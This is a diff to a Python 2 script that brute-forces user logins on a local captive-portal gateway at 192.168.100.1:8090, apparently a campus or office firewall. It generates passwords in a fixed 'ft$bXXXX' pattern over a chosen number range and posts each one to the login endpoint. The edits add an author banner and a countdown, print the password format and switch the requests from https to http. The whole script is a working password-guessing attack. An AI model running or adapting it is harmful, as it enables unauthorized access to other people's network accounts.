@@ -5,8 +5,19 @@ import urllib
 import time
 import datetime
 import urllib2
+import sys
 import xml.dom.minidom as XML
-#userid = raw_input("enter user id:")
+
+#CountDown And Credits
+def countdown(num):
+    for i in xrange(num,0,-1):
+        time.sleep(1)
+        sys.stdout.write(str(i%10)+'\r')
+        sys.stdout.flush()
+        
+print 'MADE BY - "XPLORE" '
+countdown(5)        
+
 userid=[]
 test=[]
 trst={}
@@ -22,7 +33,7 @@ for j in checkList1:
         #userid ='1307117'
         test.append('ft$b'+str("%02d"%j)+str("%02d"%i))
 '''
-
+print  'Password will be of "ft$bXXXX" format'
 range_st=int(raw_input("Enter the starting number:"))
 range_ed=int(raw_input("Enter the last number:"))
 
@@ -31,7 +42,7 @@ for i in range(range_st,range_ed+1):
 print "-------------------------------"
 print len(test)
 def sendLoginRequest(username, password):
-    url = 'https://192.168.100.1:8090/httpclient.html'
+    url = 'http://192.168.100.1:8090/httpclient.html'
     post_data = 'mode=191' + '&username=' + str(username) + '&password=' + password
     try:
         req = urllib2.Request(url, post_data)
@@ -52,7 +63,7 @@ def sendLoginRequest(username, password):
         return False
 
 def sendLogoutRequest(username):
-    url = 'https://192.168.100.1:8090/httpclient.html'
+    url = 'http://192.168.100.1:8090/httpclient.html'
     post_data = 'mode=193' + '&username=' + username
     req = urllib2.Request(url, post_data)
     response = urllib2.urlopen(req)
@@ -74,11 +85,6 @@ for o in userid:
          
 
 print trst
-#lgt = raw_input("do you want to log out -type yes  :")
-
-#if lgt == 'yes':
-    #sendLogoutRequest(userid)
-
 
 
 
